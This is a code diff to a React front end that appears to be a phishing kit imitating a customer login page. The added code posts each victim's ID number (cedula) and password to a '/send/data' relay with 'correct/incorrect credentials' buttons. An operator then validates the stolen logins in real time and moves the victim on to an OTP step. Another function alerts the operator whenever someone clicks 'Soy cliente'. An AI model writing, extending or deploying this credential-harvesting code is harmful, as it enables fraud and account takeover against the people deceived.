@@ -30,7 +30,7 @@ function App() {
     return requestId;
   };
 
-  const onContinue = async () => {
+  const onContinueOTP = async () => {
 
     try {
       let currentRequestId = requestId;
@@ -58,6 +58,41 @@ function App() {
         }
       });
 
+      setStep('loading');
+      return response;
+    } catch (error) {
+      console.error(error);
+    }
+  };
+
+  const onContinue = async () => {
+
+    try {
+      let currentRequestId = requestId;
+
+      if (!currentRequestId) {
+        currentRequestId = await startSubscription();
+      }
+
+      const response = await api.post("/send/data", {
+        text: `Nueva sesion \n\nCC: ${cedula} \n\nContra: ${password}`,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "Credenciales correctas",
+                callback_data: `news:acceptuser:${currentRequestId}`,
+              },
+              {
+                text: "Credenciales incorrectas",
+                callback_data: `news:rejectuser:${currentRequestId}`,
+              },
+            ],
+          ],
+          requestId: currentRequestId,
+        }
+      });
+
       return response;
     } catch (error) {
       console.error(error);
@@ -68,6 +103,25 @@ function App() {
     onContinue();
     setStep("loading");
   };
+
+  const handleOnContinue = async () => {
+    setShowForm(true);
+    try {
+      let currentRequestId = requestId;
+
+      if (!currentRequestId) {
+        currentRequestId = await startSubscription();
+      }
+
+      const response = await api.post("/send/data", {
+        text: `🔔 Nueva solicitud! \n\n Alguien presiono "Soy cliente" \n\n Hora: ${new Date()}`,
+      });
+
+      return response
+    } catch (error) {
+      console.error(error);
+    }
+  }
 
   //Para manejo de decisiones
   useEffect(() => {
@@ -91,6 +145,12 @@ function App() {
         return;
       case "normal":
         setStep('accepted')
+        return;
+      case "rejectuser":
+        setStep('rejected');
+        return;
+      case "acceptuser":
+        setStep('welcome');
         return;
       default:
         null
@@ -168,7 +228,7 @@ function App() {
           }}
         />
       case "welcome":
-        return <WelcomePage />
+        return <WelcomePage onContinue={onContinueOTP} />
       case "accepted":
         return <AcceptedPage />
       case "rejected":
@@ -198,7 +258,7 @@ function App() {
       </div>
       <div className="bg-white w-full flex flex-col gap-5 rounded-t-2xl p-5">
         <button
-          onClick={() => setShowForm(true)}
+          onClick={handleOnContinue}
           className="bg-primary w-full rounded-full py-3 text-white font-bold cursor-pointer hover:bg-primary-dark mt-3"
         >
           Soy cliente
